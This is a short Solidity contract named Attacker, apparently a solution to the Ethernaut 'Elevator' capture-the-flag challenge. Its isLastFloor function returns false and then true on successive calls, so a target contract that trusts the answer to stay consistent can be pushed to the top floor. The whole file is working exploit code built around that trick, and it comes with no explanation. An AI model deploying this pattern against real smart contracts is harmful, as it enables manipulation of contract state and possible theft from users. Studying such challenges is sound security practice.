// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
	function goTo(uint _floor) external;
}

contract Attacker {

	bool private lastFloor;

	function goTo(address _elevator, uint _floor) external {
		lastFloor = true;
		IElevator(_elevator).goTo(_floor);
	}

	function isLastFloor(uint) external returns (bool) {
		lastFloor = !lastFloor;
		return lastFloor;
	}

}
